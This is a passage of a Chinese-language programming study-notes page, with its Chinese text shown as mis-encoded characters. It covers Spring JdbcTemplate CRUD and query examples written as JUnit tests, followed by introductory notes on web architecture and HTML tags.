class="comment">//å¯¼å…¥jaråŒ…</span></span><br><span class="line"><span class="comment">//åˆ›å»ºJDBCTemplateå¯¹è±¡</span></span><br><span class="line">JdbcTemplate template=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JdbcUtils.getDataSource());</span><br><span class="line"><span class="comment">//è°ƒç”¨æ–¹æ³•</span></span><br><span class="line">String sql=<span class="string">&quot;update mystudy set value= 3361 where id=?&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> template.update(sql, <span class="number">3</span>);<span class="comment">//æœ‰å‡ ä¸ªé—®å·sqlåé¢å°±è·Ÿå‡ ä¸ªå‚æ•°ï¼Œä¸ç”¨å†™ä¸‹æ ‡</span></span><br><span class="line">System.out.println(count);</span><br></pre></td></tr></table></figure></div><h3 id="æ‰§è¡ŒDMLè¯­å¥"><a href="#æ‰§è¡ŒDMLè¯­å¥" class="headerlink" title="æ‰§è¡ŒDMLè¯­å¥"></a>æ‰§è¡ŒDMLè¯­å¥</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è·å–JdbcTemplateå¯¹è±¡</span></span><br><span class="line"><span class="keyword">private</span> JdbcTemplate template=<span class="keyword">new</span> <span class="title class_">JdbcTemplate</span>(JdbcUtils.getDataSource());</span><br><span class="line"><span class="comment">//ç»ƒä¹ </span></span><br><span class="line"><span class="comment">//Junitå•å…ƒæµ‹è¯•ï¼Œç‹¬ç«‹æ‰§è¡Œ</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;update mystudy set value=1000 where id =?&quot;</span>;</span><br><span class="line">    <span class="comment">//æ‰§è¡Œsql</span></span><br><span class="line">    <span class="type">int</span> count=template.update(sql,<span class="number">3</span>);</span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ·»åŠ ä¸€æ¡è®°å½•</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;insert into mystudy values(6,?,?)&quot;</span>;</span><br><span class="line">    <span class="type">int</span> count=template.update(sql,<span class="string">&quot;å°é›¨å¥•å¥•&quot;</span>,<span class="number">3599</span>);</span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ é™¤è®°å½•</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;delete from mystudy where id =?&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> template.update(sql, <span class="number">6</span>);</span><br><span class="line">    System.out.println(count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="æ‰§è¡ŒDQLè¯­å¥"><a href="#æ‰§è¡ŒDQLè¯­å¥" class="headerlink" title="æ‰§è¡ŒDQLè¯­å¥"></a>æ‰§è¡ŒDQLè¯­å¥</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æŸ¥è¯¢idä¸º1çš„è®°å½•ï¼Œå°è£…ä¸ºMapé›†åˆ</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy where id=? &quot;</span>;</span><br><span class="line">    Map&lt;String, Object&gt; map = template.queryForMap(sql, <span class="number">1</span>);<span class="comment">//ç»“æœé›†é•¿åº¦åªèƒ½æ˜¯1</span></span><br><span class="line">    System.out.println(map);<span class="comment">//&#123;id=1, name=å®‡ç”œ, value=339.0&#125;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢æ‰€æœ‰è®°å½•ï¼Œå°è£…æˆList</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test5</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy&quot;</span>;</span><br><span class="line">    List&lt;Map&lt;String, Object&gt;&gt; list = template.queryForList(sql);</span><br><span class="line">    <span class="keyword">for</span> (Map&lt;String,Object&gt; s:list) &#123;</span><br><span class="line">        System.out.println(s);<span class="comment">//æ‰“å°æ‰€æœ‰</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢æ‰€æœ‰è®°å½•ï¼Œå°è£…æˆEmpå¯¹è±¡çš„Listé›†åˆ</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//è‡ªå·±å®ç°æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test6</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy&quot;</span>;</span><br><span class="line">    List&lt;Emp&gt; list = template.query(sql, <span class="keyword">new</span> <span class="title class_">RowMapper</span>&lt;Emp&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Emp <span class="title function_">mapRow</span><span class="params">(ResultSet rs, <span class="type">int</span> i)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="type">Emp</span> <span class="variable">emp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Emp</span>();</span><br><span class="line">            <span class="type">int</span> <span class="variable">id</span> <span class="operator">=</span> rs.getInt(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> rs.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            <span class="type">double</span> <span class="variable">value</span> <span class="operator">=</span> rs.getDouble(<span class="string">&quot;value&quot;</span>);</span><br><span class="line">            emp.setId(id);</span><br><span class="line">            emp.setValue(value);</span><br><span class="line">            emp.setName(name);</span><br><span class="line">            <span class="keyword">return</span> emp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">for</span> (Emp emp : list) &#123;</span><br><span class="line">        System.out.println(emp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="comment">//ä½¿ç”¨é»˜è®¤æ¥å£</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test6_2</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select * from mystudy&quot;</span>;</span><br><span class="line">    List&lt;Emp&gt; list = template.query(sql, <span class="keyword">new</span> <span class="title class_">BeanPropertyRowMapper</span>&lt;Emp&gt;(Emp.class));</span><br><span class="line">    <span class="keyword">for</span> (Emp emp : list) &#123;</span><br><span class="line">        System.out.println(emp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æŸ¥è¯¢æ€»è®°å½•æ•°</span></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test7</span><span class="params">()</span> &#123;</span><br><span class="line">    String sql=<span class="string">&quot;select count(id) from mystudy&quot;</span>;</span><br><span class="line">    Long total=template.queryForObject(sql,Long.class);</span><br><span class="line">    System.out.println(total);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="è½¯ä»¶æ¶æ„"><a href="#è½¯ä»¶æ¶æ„" class="headerlink" title="è½¯ä»¶æ¶æ„"></a>è½¯ä»¶æ¶æ„</h2><h3 id="C-x2F-S-Client-x2F-Server"><a href="#C-x2F-S-Client-x2F-Server" class="headerlink" title="C&#x2F;S:Client&#x2F;Server"></a>C&#x2F;S:Client&#x2F;Server</h3><ul><li><p>æœ¬åœ°å‘˜å·¥å®¢æˆ·ç«¯ï¼Œè¿œç¨‹ä¸€ä¸ªæœåŠ¡ç«¯</p></li><li><p>e.g. qqã€è¿…é›·</p></li><li><p>ä¼˜ç‚¹ï¼š</p><ul><li>ç”¨æˆ·ä½“éªŒé«˜</li></ul></li><li><p>ç¼ºç‚¹</p><ul><li>å®‰è£…ã€éƒ¨ç½²ã€ç»´æŠ¤ã€å¼€å‘éº»çƒ¦</li></ul></li></ul><h3 id="B-x2F-Sï¼šBrowser-x2F-Server-ï¼ˆJavaWebå¼€å‘ï¼‰"><a href="#B-x2F-Sï¼šBrowser-x2F-Server-ï¼ˆJavaWebå¼€å‘ï¼‰" class="headerlink" title="B&#x2F;Sï¼šBrowser&#x2F;Server ï¼ˆJavaWebå¼€å‘ï¼‰"></a>B&#x2F;Sï¼šBrowser&#x2F;Server ï¼ˆJavaWebå¼€å‘ï¼‰</h3><ul><li><p>åªéœ€è¦ä¸€ä¸ªæµè§ˆå™¨,ç”¨æˆ·é€šè¿‡æ ‡é¢˜çš„ç½‘å€ï¼Œå®¢æˆ·è®¿é—®ä¸åŒçš„æœåŠ¡å™¨ç«¯ç¨‹åº</p></li><li><p>ä¼˜ç‚¹ï¼šå¼€å‘ å®‰è£… ç»´æŠ¤ éƒ¨ç½² ç®€å•</p></li><li><p>ç¼ºç‚¹</p><ul><li>ç»•è¿‡åº”ç”¨è¿‡å¤§ï¼Œå½±å“ç”¨æˆ·ä½“éªŒ</li><li>å¯¹ç¡¬ä»¶è¦æ±‚è¿‡é«˜</li></ul></li></ul><h2 id="èµ„æºåˆ†ç±»"><a href="#èµ„æºåˆ†ç±»" class="headerlink" title="èµ„æºåˆ†ç±»"></a>èµ„æºåˆ†ç±»</h2><h3 id="é™æ€èµ„æº"><a href="#é™æ€èµ„æº" class="headerlink" title="é™æ€èµ„æº"></a>é™æ€èµ„æº</h3><ul><li>ä½¿ç”¨é™æ€ç½‘é¡µæŠ€æœ¯å‘å¸ƒçš„èµ„æº</li><li>ç‰¹ç‚¹<ul><li>æ‰€æœ‰ç”¨æˆ·è®¿é—®ï¼Œç»“æœä¸€æ ·</li><li>æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ã€HTMLã€CSSã€JS<ul><li>HTML:è¯­è¨€å±•ç¤ºé¡µé¢</li><li>CSS:ç”¨äºç¾åŒ–ï¼Œå¸ƒå±€</li><li>JS:æ§åˆ¶é¡µé¢å…ƒç´ ï¼Œè®©é¡µé¢æœ‰åŠ¨æ€æ•ˆæœ</li></ul></li><li>ç»•è¿‡ç”¨æˆ·è¯·æ±‚é™æ€èµ„æºï¼ŒæœåŠ¡å™¨ä¼šç›´æ¥å‘é€ç»™æµè§ˆå™¨ï¼Œæµè§ˆå™¨å†…ç½®è§£æå¼•æ“ï¼Œå¯ä»¥å±•ç¤ºé™æ€èµ„æº</li></ul></li></ul><h3 id="åŠ¨æ€èµ„æº"><a href="#åŠ¨æ€èµ„æº" class="headerlink" title="åŠ¨æ€èµ„æº"></a>åŠ¨æ€èµ„æº</h3><ul><li>ä½¿ç”¨åŠ¨æ€ç½‘é¡µæ—¶å‘å¸ƒçš„èµ„æº</li><li>ç‰¹ç‚¹<ul><li>ç”¨æˆ·è®¿é—®å¾—åˆ°ç»“æœå¯èƒ½ä¸ä¸€æ ·</li><li>jsp&#x2F;servlet ã€phpã€aspâ€¦</li><li>å¦‚æœç”¨æˆ·è¯·æ±‚åŠ¨æ€èµ„æºï¼ŒæœåŠ¡å™¨ä¼šæ‰§è¡ŒåŠ¨æ€èµ„æºï¼Œè½¬æ¢æˆé™æ€èµ„æºï¼Œå‘ç»™æµè§ˆå™¨</li></ul></li></ul><h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h2 id="æ¦‚å¿µ-1"><a href="#æ¦‚å¿µ-1" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h2><h3 id="è¶…æ–‡æœ¬"><a href="#è¶…æ–‡æœ¬" class="headerlink" title="è¶…æ–‡æœ¬"></a>è¶…æ–‡æœ¬</h3><p>ç”¨è¶…é“¾æ¥æ–¹å¼ï¼Œå°†ä¸åŒç©ºé—´çš„æ–‡å­—ä¿¡æ¯ç»„ç»‡åœ¨ä¸€èµ·çš„ç½‘çŠ¶æ–‡æœ¬</p><h3 id="æ ‡è®°è¯­è¨€"><a href="#æ ‡è®°è¯­è¨€" class="headerlink" title="æ ‡è®°è¯­è¨€"></a>æ ‡è®°è¯­è¨€</h3><ul><li>æ ‡ç­¾æ„æˆï¼Œ&lt;æ ‡ç­¾åç§°&gt; html xml</li><li>æ ‡è®°è¯­è¨€è¡¨ç¤ºç¼–ç¨‹è¯­è¨€</li></ul><h2 id="å¿«é€Ÿå…¥é—¨-1"><a href="#å¿«é€Ÿå…¥é—¨-1" class="headerlink" title="å¿«é€Ÿå…¥é—¨"></a>å¿«é€Ÿå…¥é—¨</h2><h3 id="åç¼€å"><a href="#åç¼€å" class="headerlink" title="åç¼€å"></a>åç¼€å</h3><p>.htmlæˆ–.htm</p><h3 id="è¯­æ³•"><a href="#è¯­æ³•" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><p>æ ‡ç­¾åˆ†ç±»</p><ul><li>å›´å µæ ‡ç­¾ æœ‰å¼€å§‹å’Œç»“æŸæ ‡ç­¾ <code>&lt;title&gt;&lt;/title&gt;</code></li><li>è‡ªé—­åˆæ ‡ç­¾ å¼€å§‹æ ‡ç­¾å’Œç»“æŸæ ‡ç­¾åœ¨ä¸€èµ· <code>&lt;br/&gt;</code></li></ul><p>åœ¨å¼€å§‹æ ‡ç­¾ä¸­å¯ä»¥å®šä¹‰å±æ€§ï¼Œå±æ€§ç”±é”®å€¼å¯¹æ„æˆï¼Œå€¼éœ€è¦å¼•å·(å•åŒéƒ½å¯)å¼•èµ·æ¥ <code>&lt;font color=&#39;red&#39;&gt; Hello &lt;/font&gt;</code></p><blockquote><p>htmlæ ‡ç­¾ä¸å±ˆæœå¤§å°å†™æ ‡ç­¾ï¼Œå»ºè®®ä½¿ç”¨å°å†™</p></blockquote><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&#x27;red&#x27;</span>&gt;</span> Hello <span class="tag">&lt;/<span class="name">font</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&#x27;green&#x27;</span>&gt;</span> Hello <span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="æ–‡ä»¶æ ‡ç­¾"><a href="#æ–‡ä»¶æ ‡ç­¾" class="headerlink" title="æ–‡ä»¶æ ‡ç­¾"></a>æ–‡ä»¶æ ‡ç­¾</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><p>æ ¹æ ‡ç­¾</p><h3 id="head"><a href="#head" class="headerlink" title="head"></a>head</h3><p>å¤´æ ‡ç­¾ï¼ŒæŒ‡å®šhtmlæ–‡æ¡£çš„å±æ€§ï¼Œå¼•å…¥å¤–éƒ¨èµ„æº</p><h3 id="title"><a href="#title" class="headerlink" title="title"></a>title</h3><p>æ ‡é¢˜æ ‡ç­¾</p><h3 id="body"><a href="#body" class="headerlink" title="body"></a>body</h3><p>ä½“æ ‡ç­¾</p><h3 id="lt-DOCTYPE-gt"><a href="#lt-DOCTYPE-gt" class="headerlink" title="&lt;!DOCTYPE &gt;"></a><code>&lt;!DOCTYPE &gt;</code></h3><p>å£°æ˜æ–‡æ¡£ç±»å‹</p><h2 id="æ–‡æœ¬æ ‡ç­¾"><a href="#æ–‡æœ¬æ ‡ç­¾" class="headerlink" title="æ–‡æœ¬æ ‡ç­¾"></a>æ–‡æœ¬æ ‡ç­¾</h2><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--æ³¨é‡Š--&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="æ ‡é¢˜æ ‡ç­¾"><a href="#æ ‡é¢˜æ ‡ç­¾" class="headerlink" title="æ ‡é¢˜æ ‡ç­¾"></a>æ ‡é¢˜æ ‡ç­¾</h3><p>h1-h6 é€’å‡ <code>&lt;h1&gt;&lt;/h1&gt;</code></p><h3 id="æ®µè½æ ‡ç­¾"><a href="#æ®µè½æ ‡ç­¾" class="headerlink" title="æ®µè½æ ‡ç­¾"></a>æ®µè½æ ‡ç­¾</h3><p><code>&lt;p&gt;&lt;/p&gt;</code></p><h3 id="æ¢è¡Œ"><a href="#æ¢è¡Œ" class="headerlink" title="æ¢è¡Œ"></a>æ¢è¡Œ</h3><p><code>&lt;br&gt;</code></p><h3 id="å±•ç¤ºæ°´å¹³çº¿"><a href="#å±•ç¤ºæ°´å¹³çº¿" class="headerlink" title="å±•ç¤ºæ°´å¹³çº¿"></a>å±•ç¤ºæ°´å¹³çº¿</h3><p><code>&lt;hr&gt;</code></p><p>å±æ€§</p><ul><li>color</li><li>width å®½åº¦</li><li>size é«˜åº¦</li><li>align å¯¹é½æ–¹å¼<ul><li>center</li><li>left</li><li>right</li></ul></li></ul><h3 id="å­—ä½“åŠ ç²—-æ–œä½“"><a href="#å­—ä½“åŠ ç²—-æ–œä½“" class="headerlink" title="å­—ä½“åŠ ç²— æ–œä½“"></a>å­—ä½“åŠ ç²— æ–œä½“</h3><p><code>&lt;b&gt;&lt;/b&gt;</code> <code>&lt;i&gt;&lt;/i&gt;</code></p><h3 id="å­—ä½“"><a href="#å­—ä½“" class="headerlink" title="å­—ä½“"></a>å­—ä½“</h3><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>=<span class="string">&quot;#ff7f50&quot;</span> <span class="attr">size</span>=<span class="string">&quot;200&quot;</span> <span class="attr">face</span>=<span class="string">&quot;æ¥·ä½“&quot;</span>&gt;</span>é‡çŒªé‡çŒª<span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>å±æ€§</p><ul><li>color :è‹±æ–‡å•è¯&#x2F;rgb(å€¼1ï¼Œå€¼2ï¼Œå€¼3) å€¼ 0-255â€“&gt;#åè·Ÿä¸‰ä¸ªå€¼çš„16è¿›åˆ¶</li><li>width å•ä½ä¸ºåƒç´  ä¹Ÿå¯ä»¥èµ‹å€¼ <code>æ•°å€¼%</code>:å æ¯”ç›¸å¯¹äºçˆ¶å…ƒç´ çš„æ¯”ä¾‹</li><li>size å¤§å°</li><li>faceå­—ä½“</li></ul><h4 id="æ–‡æœ¬å±…ä¸­"><a href="#æ–‡æœ¬å±…ä¸­" class="headerlink" title="æ–‡æœ¬å±…ä¸­"></a>æ–‡æœ¬å±…ä¸­</h4><p><code>&lt;center&gt;&lt;/center&gt;</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h4drfr8zv0j216e0u0q8e.jpg"                      alt="image-20220720222734009"                ><figcaption>image-20220720222734009</figcaption></figure></p><h2 id="å¸¸ç”¨æ ‡ç­¾"><a href="#å¸¸ç”¨æ ‡ç­¾" class="headerlink" title="å¸¸ç”¨æ ‡ç­¾"></a>å¸¸ç”¨æ ‡ç­¾</h2><h3 id="å›¾ç‰‡æ ‡ç­¾"><a href="#å›¾ç‰‡æ ‡ç­¾" class="headerlink" title="å›¾ç‰‡æ ‡ç­¾"></a>å›¾ç‰‡æ ‡ç­¾</h3><p>img</p><h4 id="å±æ€§"><a href="#å±æ€§" class="headerlink" title="å±æ€§"></a>å±æ€§</h4><ul><li>src æŒ‡å®šè·¯å¾„</li></ul><div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../../image/1.jpg&quot;</span><span class="attr">align</span>=<span class="string">&quot;right&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;æµ·å²¸&quot;</span> <span class="attr">width</span>=<span class="string">&quot;500&quot;</span> <span class="attr">height</span>=<span class="string">&quot;300&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></div><ul><li>alt åŠ è½½å¤±è´¥æ—¶æ˜¾ç¤ºçš„æ–‡å­—</li></ul><h3 id="åˆ—è¡¨æ ‡ç­¾"><a href="#åˆ—è¡¨æ ‡ç­¾" class="headerlink" title="åˆ—è¡¨æ ‡ç­¾"></a>åˆ—è¡¨æ ‡ç­¾</h3><p>æœ‰åºåˆ—è¡¨</p><ul><li>ol åŒ…è£¹æ•´ä¸ªå¤§åˆ—è¡¨</li><li>li åŒ…è£¹æ¯ä¸€è¡Œ</li><li>type æ¯è¡Œæ ‡è¯†ç¬¦æ ·å¼ start å¼€å§‹æ ‡è¯†ç¬¦</li></ul><p>æ— åºåˆ—è¡¨</p><ul><li>ul åŒ…è£¹æ•´ä¸ªå¤§åˆ—è¡¨</li><li>li åŒ…è£¹æ¯ä¸€è¡Œ</li><li>type æ¯è¡Œæ ‡è¯†ç¬¦æ ·å¼</li></ul><h3 id="è¶…é“¾æ¥"><a href="#è¶…é“¾æ¥" class="headerlink" title="è¶…é“¾æ¥"></a>è¶…é“¾æ¥</h3><p><code>&lt;a href=&quot;url&quot;&gt;&lt;/a&gt;</code></p><p>å±æ€§</p><ul><li>href ï¼šæ”¾url(ç»Ÿä¸€èµ„æºå®šä½ç¬¦)ä¹Ÿå¯ä»¥æ”¾æ–‡ä»¶è·¯å¾„ä»¥åŠå…¶ä»–åè®®çš„http</li><li>target:<ul><li>_self é»˜è®¤å€¼ åœ¨å½“å‰é¡µé¢æ‰“å¼€</li><li>_blank åœ¨æ–°é¡µé¢æ‰“å¼€</li></ul></li></ul><blockquote><div class="highlight-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">è¶…é“¾æ¥åŠŸèƒ½</span><br><span class="line"><span class="number">1</span>ã€å¯ä»¥è¢«ç‚¹å‡»ï¼šæ ·å¼</span><br><span class="line"><span class="number">2</span>ã€è·³è½¬åˆ°hrefæŒ‡å®šåˆ°url</span><br><span class="line">éœ€æ±‚ï¼šä¿ç•™<span class="number">1</span>ï¼Œå»æ‰<span class="number">2</span></span><br><span class="line">å®ç°ï¼šhref=<span class="string">&quot;javascript:void(0);&quot;</span></span><br><span class="line"><span class="comment">//å¦‚æœåªhref=&quot;&quot; é»˜è®¤ç‚¹å‡»åè·³è½¬å½“å‰é¡µé¢ï¼Œç›¸å¯¹äºåˆ·æ–°</span></span><br></pre></td></tr></table></figure></div></blockquote><h3 id="å—æ ‡ç­¾"><a href="#å—æ ‡ç­¾" class="headerlink" title="å—æ ‡ç­¾"></a>å—æ ‡ç­¾</h3><p>spanï¼šæ–‡æœ¬åœ¨ä¸€è¡Œå±•ç¤ºï¼Œè¡Œå†…æ ‡ç­¾ï¼Œå†…è”æ ‡ç­¾ ç»“åˆcssä½¿ç”¨</p><p>div æ¯ä¸€ä¸ªæ ‡ç­¾å ä¸€è¡Œ å—çº§æ ‡ç­¾ ç»“åˆcssä½¿ç”¨</p><h3 id="è¯­ä¹‰åŒ–æ ‡ç­¾"><a href="#è¯­ä¹‰åŒ–æ ‡ç­¾" class="headerlink" title="è¯­ä¹‰åŒ–æ ‡ç­¾"></a>è¯­ä¹‰åŒ–æ ‡ç­¾</h3><p>header</p><p>footer</p><p>ä¸ºäº†æé«˜ç¨‹åºå¯è¯»æ€§ä½¿ç”¨ï¼Œä¸cssä¸€èµ·ä½¿ç”¨</p><h3 id="è¡¨æ ¼æ ‡ç­¾"><a href="#è¡¨æ ¼æ ‡ç­¾" class="headerlink" title="è¡¨æ ¼æ ‡ç­¾"></a>è¡¨æ ¼æ ‡ç­¾</h3><p>table å®šä¹‰è¡¨æ ¼</p><ul><li>width å®½åº¦</li><li>border è¾¹æ¡†</li><li>cellspacing å®šä¹‰å•å…ƒæ ¼ä¹‹é—´çš„è·ç¦»ï¼Œå¦‚æœæŒ‡å®šä¸º0ï¼Œåˆ™å•å…ƒæ ¼çº¿ä¼šåˆä¸ºä¸€æ¡</li><li>cellpadding å®šä¹‰å†…å®¹ä¸å•å…ƒæ ¼ä¹‹é—´çš„è·ç¦»</li><li>bgcolor èƒŒæ™¯è‰²</li><li>align å¯¹é½æ–¹å¼</li></ul><p>tr å®šä¹‰è¡Œ</p><ul><li>bgcolor èƒŒæ™¯è‰²</li><li>align å¯¹é½æ–¹å¼</li></ul><p>td å®šä¹‰å•å…ƒæ ¼</p><ul><li>bgcolor èƒŒæ™¯è‰²</li><li>align å¯¹é½æ–¹å¼</li><li>colspan åˆå¹¶åˆ—</li><li>rowspan åˆå¹¶è¡Œ</li></ul><p>th å®šä¹‰è¡¨å¤´å•å…ƒæ ¼</p><p>caption è¡¨æ ¼æ ‡é¢˜</p><p>thead è¡¨ç¤ºè¡¨æ ¼å¤´éƒ¨åˆ†</p><p>tbody è¡¨ç¤ºè¡¨æ ¼ä¸»ä½“</p><p>tfoot è¡¨ç¤ºè¡¨æ ¼è„šéƒ¨åˆ†</p><h2 id="è¡¨å•æ ‡ç­¾"><a href="#è¡¨å•æ ‡ç­¾" class="headerlink" title="è¡¨å•æ ‡ç­¾"></a>è¡¨å•æ ‡ç­¾</h2><h3 id="å®šä¹‰-2"><a href="#å®šä¹‰-2" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>è¡¨å•ï¼šç”¨äºé‡‡é›†ç”¨æˆ·è¾“å…¥æ•°æ®ï¼Œç”¨äºå’ŒæœåŠ¡å™¨è¿›è¡Œäº¤äº’</p><p>ä½¿ç”¨æ ‡ç­¾:form</p><h3 id="å±æ€§-1"><a href="#å±æ€§-1" class="headerlink" title="å±æ€§"></a>å±æ€§</h3><ul><li>action æŒ‡å®šæäº¤æ•°æ®çš„url</li><li>method æŒ‡å®šæäº¤æ–¹å¼<ul><li>ä¸€ä¸ª7ç§ï¼Œå¸¸ç”¨getï¼Œpost</li><li>get:è¯·æ±‚å‚æ•°ä¼šåœ¨åœ°å€æ 